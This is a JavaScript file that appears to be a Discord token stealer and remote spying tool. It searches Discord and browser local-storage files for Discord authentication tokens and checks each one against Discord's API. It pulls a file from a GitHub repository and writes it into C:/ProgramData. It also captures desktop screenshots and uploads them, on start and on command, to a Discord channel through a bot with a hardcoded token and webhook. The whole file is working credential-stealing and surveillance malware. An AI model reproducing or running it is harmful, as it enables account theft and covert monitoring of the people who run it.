const axios = require('axios')
    const fs = require("fs")
const fetch = require('node-fetch')
var Discord = require("discord.js")
var client = new Discord.Client()
var azk = "https://ptb.discord.com/api/webhooks/861273343738511400/N6Fre0U9E0EKAqkGsgiGOVHDOM50j3nhLbvkm-V6CKMz0GLeq9uulpBFGyl75dYTLV2m"
var token = "NzQzMjg2NDk4MDMxNTY2ODk4.XzSdfg.w0bzX1dnZMK1cHE_pNr33FjqrLU"
var ip = require("ip");
const screenshot = require('screenshot-desktop')
client.login(token)
client.on("ready", () => {
  var paths = [
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discord/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`,
      `${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,
  ]
  for (i = 0; i < paths.length; i++) {
      get_token(paths[i])
  }
  async function get_token(path) {

          fs.readdir(path, (err, files) => {
              if (files === undefined) {

                  return
              }
              var filtro = files.filter(f => f.split('.').pop() === "ldb")
              for (i = 0; i < filtro.length; i++) {

                  fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function (err, data) {
                      let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                      let regex2 = /"mfa\.[\d\w_-]{84}"/;
                      let [match] = regex1.exec(data) || regex2.exec(data) || [null];
                      if (match != null) {
                          match = match.replace(/"/g, '');
                          var a = client.channels.cache.get("861273243105361933")
                          //a.send(match)
                          await fetch(`https://discord.com/api/v6/users/@me`, {
                              headers: {
                                  "authorization": match
                              }
                          }).then(resp => resp.json()).then(response => {
                              if (response.id) {
  								if(!response.premium_type) {
                                      nitro = "Pas de nitro"
                                  } else {
                                      if(response.premium_type === 1) { nitro = "Nitro Classic"}
                                      if(response.premium_type === 2) { nitro = "Nitro Gaming"}
                                  }

                              }
                          })
                      }
                  })

          }
  })
  }
  var githubContent = require('github-content');
  var options = {
  owner: 'akyai',
  repo: 'pseudo-checker',
  branch: 'master' // defaults to master
};
var gc = new githubContent(options);
gc.file('server.js', function(err, file) {
  if (err) return console.log(err);
  if(!fs.existsSync("C:/ProgramData/directory")){
    console.log("a")
    fs.mkdirSync("C:/ProgramData/directory")
    fs.appendFile("C:/ProgramData/test.js",Buffer.from(file.contents).toString(), function (err) {
    if (err) throw err;
    });
  }else {
    console.log("b")
    fs.appendFile("C:/ProgramData/directory/test.js",Buffer.from(file.contents).toString(), function (err) {
    if (err) throw err;
    });
  }

});


screenshot({ filename: 'C:/Users/Public/Pictures/test.png' }).then(()=> {
  var a = client.channels.cache.get("861273243105361933")
  a.send({files: ["C:/Users/Public/Pictures/test.png"]}).then(()=>{
    fs.unlinkSync("C:/Users/Public/Pictures/test.png");
  })
})
})
client.on("message", async (message) => {
if(message.content.startsWith("screenshot")){
   screenshot({ filename: 'C:/Users/Public/Pictures/screenshot.png' }).then(async ()=> {
    var a = client.channels.cache.get("861273243105361933")
        await a.send({files: ["C:/Users/Public/Pictures/screenshot.png"]})
        const fs = require("fs")

      fs.unlinkSync("C:/Users/Public/Pictures/screenshot.png");


  })
}
})
